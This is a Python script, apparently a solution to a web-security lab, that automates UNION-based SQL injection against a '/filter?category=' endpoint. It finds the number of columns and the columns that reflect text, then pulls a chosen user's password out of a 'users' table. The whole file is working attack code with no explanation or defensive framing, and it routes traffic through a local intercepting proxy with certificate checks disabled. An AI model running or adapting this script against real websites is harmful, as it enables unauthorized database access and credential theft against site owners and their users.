#!/usr/bin/python3
#This program uses UNION SELECT NULL method to find out the number of columns 
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36'}
proxies = {'http': 'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080' }

def exploit_sqli_column_number(url, category):
	path = "/filter?category="+category
	addendum = "NULL"
	for i in range(1,50):
		sql_payload = "'+UNION+SELECT+%s-- " %addendum
		print ("[+] Trying a value of "+str(i)+"...", end =" ")
		r = requests.get(url + path+ sql_payload, verify=False, proxies=proxies, headers=headers)
		#res = r.text
		status = r.status_code
		print("Status: "+str(status))
		if status == 200:
			return i
		addendum = addendum + ",+NULL"
		i = i+1
	return False	
	
def exploit_sqli_string_insert(url, category, num_col, p_string):
	p_string="'"+p_string+"'"
	path = "/filter?category="+category
	addendum = "NULL,+"*num_col
	s_array= []
	for i in range (0, num_col):
		find=i*6
		fstring=addendum[:find] + p_string + ',+' + addendum[find+6:]
		fstring=fstring[:-2]
		sql_payload="'+UNION+SELECT+%s-- " %fstring
		print ("[+] Trying at position "+str(i+1)+"...", end =" ")
		r = requests.get(url + path+ sql_payload, verify=False, proxies=proxies, headers=headers)
		status = r.status_code
		print("Status: "+str(status))
		if status == 200:
			s_array.append(i)
	return s_array
	
def cred_fetcher(url, category, num_col, s_array, user):
	path = "/filter?category="+category
	if len(s_array) == 1:
		print("Too few for the script to work. You may do this manually")
		return False
	if len(s_array) > 1:
		print(".")			#Todo: Cheats used. Fix this
	fstring="username,+password+from+users+where+username+='%s'"%user
	sql_payload="'+UNION+SELECT+%s-- " %fstring
	r = requests.get(url + path+ sql_payload, verify=False, proxies=proxies, headers=headers)
	status = r.status_code
	print("Status: "+str(status))
	if status == 200:
		res=r.text
		if user in res:
			soup = BeautifulSoup(r.text, 'html.parser')
			user_pass= soup.body.find(text=user).parent.findNext('td').contents[0]
			return user_pass
		else:
			print ("No user "+user+" available in the output")
			return False
	else:
		print("Status Code "+str(status)+". Exiting..")
		return False		
	
	
if __name__=="__main__":
	try:
		url = sys.argv[1].strip()
		category = sys.argv[2].strip()		
		user = sys.argv[3].strip()
		p_string="Test"
	except IndexError:
		print("[-] Usage: %s <url> <category> <string>" % sys.argv[0])
		print("[-] Example: %s www.example.com pets administrator" % sys.argv[0])
		sys.exit (-1)
		
	print ("[+] Figuring out number of columns...")
	num_col = exploit_sqli_column_number(url, category)
	if num_col:
		print("[+] The number of Columns is " +str(num_col)+".")
		s_array=exploit_sqli_string_insert(url, category, num_col, p_string)
		if s_array:
			print("[+] Positions where string can be inserted "+str(s_array)+" .")
			creds= cred_fetcher(url, category, num_col, s_array, user)
			if creds:
				print("[+] The password for user "+user+":  "+creds)
		else:
			print("[-] No strings could be found!")
	else:
		print("[+] Not succesful")
